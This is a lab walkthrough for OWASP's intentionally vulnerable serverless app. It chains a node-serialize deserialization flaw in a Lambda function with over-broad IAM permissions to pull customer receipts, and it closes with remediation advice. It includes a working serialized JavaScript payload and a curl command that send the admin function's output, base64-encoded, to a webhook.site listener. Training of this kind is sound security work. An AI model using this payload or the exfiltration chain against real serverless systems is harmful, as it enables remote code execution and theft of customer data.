# DVSA Lesson 3: Chaining Insecure Deserialization for Data Exfiltration

**Category:** Serverless Security / Insecure Deserialization / IAM Misconfiguration
**Target Platform:** OWASP Damn Vulnerable Serverless Application (DVSA)
**Current Year:** 2026

-----

## 1\. Overview

In this lesson, we explore a critical vulnerability chain. We will use an **Insecure Deserialization** flaw in a Node.js Lambda function (`DVSA-ORDER`) to execute arbitrary code. From there, we abuse **Excessive IAM Permissions** to invoke an internal administrative function (`DVSA-ADMIN-GET-RECEIPT`) that leaks a signed S3 URL containing sensitive customer receipts.

### The Attack Flow

1.  **Inject:** Send a serialized IIFE (Immediately Invoked Function Expression) to the `/order` endpoint.
2.  **Execute:** The `node-serialize` library executes our code inside the Lambda environment.
3.  **Pivot:** Our code uses the Lambda's own identity to call an admin function.
4.  **Exfiltrate:** The admin function generates a signed S3 link, which our payload sends to a webhook.

-----

## 2\. Reconnaissance

### Identifying the Target Function

First, we need to know what administrative functions are available. In a real-world scenario, you might find these through error messages or documentation. For this lab, we can list them via CLI:

```bash
# List functions to find administrative tools
aws lambda list-functions --query 'Functions[*].FunctionName' --output table | grep ADMIN
```

We find `DVSA-ADMIN-GET-RECEIPT`. This function is designed to bundle receipts into a `.zip` file and provide a download link.

-----

## 3\. Preparation: The Payload

We use the `node-serialize` vulnerability. By prefixing a function with `_$$ND_FUNC$$_`, the library will execute it immediately upon deserialization.

### The Exploit Script

This script will run inside the AWS Lambda. It invokes the admin function for **April 2026** and sends the result to our webhook.

```javascript
// Conceptual payload
_$$ND_FUNC$$_function(){
    const { LambdaClient, InvokeCommand } = require("@aws-sdk/client-lambda");
    const c = new LambdaClient();
    const cmd = new InvokeCommand({
        FunctionName: "DVSA-ADMIN-GET-RECEIPT",
        InvocationType: "RequestResponse",
        Payload: Buffer.from(JSON.stringify({"year": "2026", "month": "04"}))
    });
    c.send(cmd).then(d => {
        const h = require("https");
        const result = Buffer.from(d.Payload).toString();
        // Send the base64 encoded result to our listener
        h.get("https://webhook.site/YOUR-UNIQUE-ID?data=" + Buffer.from(result).toString("base64"));
    });
}()
```

-----

## 4\. Execution Step-by-Step

### Step 1: Set up a Listener

Go to [Webhook.site](https://www.google.com/search?q=https://webhook.site) and copy your unique URL. This will act as our C2 (Command and Control) server to catch the exfiltrated S3 link.

### Step 2: Fire the Exploit

Use `Burp Suite` or `curl` to send the payload to the vulnerable `/order` endpoint.

**Using Curl:**

```bash
curl -X POST https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order \
-H "Authorization: <YOUR_JWT_TOKEN>" \
-H "Content-Type: application/json" \
-d '{"action":"_$$ND_FUNC$$_function(){const {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");const c=new LambdaClient();const cmd=new InvokeCommand({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",InvocationType:\"RequestResponse\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))});c.send(cmd).then(d=>{const h=require(\"https\");const result=Buffer.from(d.Payload).toString();h.get(\"https://webhook.site/<YOUR_ID>?data=\"+Buffer.from(result).toString(\"base64\"));});}()","cart-id":""}'
```

### Step 3: Decode the Exfiltrated Data

Check your Webhook.site dashboard. You will see a GET request with a `data` parameter. Copy that Base64 string and decode it using **CyberChef**.

### Step 4: Download the Loot

The decoded JSON contains a `download_url`. Use `curl` in your terminal to download the ZIP file.

```bash
# Download the zip
curl -o receipts.zip "https://dvsa-receipts-bucket.s3.amazonaws.com/..."

# Unzip and view
unzip receipts.zip
tree  # View the structure
cat 2026/04/08/*.txt # Read the sensitive info
```

-----

## 5\. Root Cause Analysis

| Vulnerability | Detail |
| :--- | :--- |
| **Insecure Deserialization** | The application uses `node-serialize` on raw user input (`action` field), allowing Remote Code Execution (RCE). |
| **IAM Over-Permissioning** | The `DVSA-ORDER` Lambda has `lambda:InvokeFunction` permissions on `*` (or specifically on admin functions), violating the **Principle of Least Privilege**. |
| **Broken Access Control** | Internal administrative functions are reachable via service-to-service calls without secondary authentication. |

-----

## 6\. Remediation Strategy

### Fix 1: Secure Deserialization

**Never** use `node-serialize` for user-supplied data. Use standard `JSON.parse()` which does not execute code.

```javascript
// ❌ Dangerous
const obj = serialize.unserialize(userInput);

// ✅ Safe
const obj = JSON.parse(userInput);
```

### Fix 2: Least Privilege IAM Policies

Restrict the Lambda's IAM role so it can only invoke what it absolutely needs. Remove `*` resources.

```json
{
    "Effect": "Allow",
    "Action": "lambda:InvokeFunction",
    "Resource": "arn:aws:lambda:us-east-1:1234567890:function:ONLY-NECESSARY-FUNCTION"
}
```

### Fix 3: Network/Environment Security

Implement an **AWS PrivateLink** or restricted VPC egress rules to prevent Lambdas from making unauthorized outbound calls to external webhooks.

-----

> **Security Note:** This walkthrough is for educational purposes within the DVSA environment. Always ensure you have explicit permission before testing any system.

How did the unzipping process go on your end? Did you notice any other interesting files in that temporary directory?
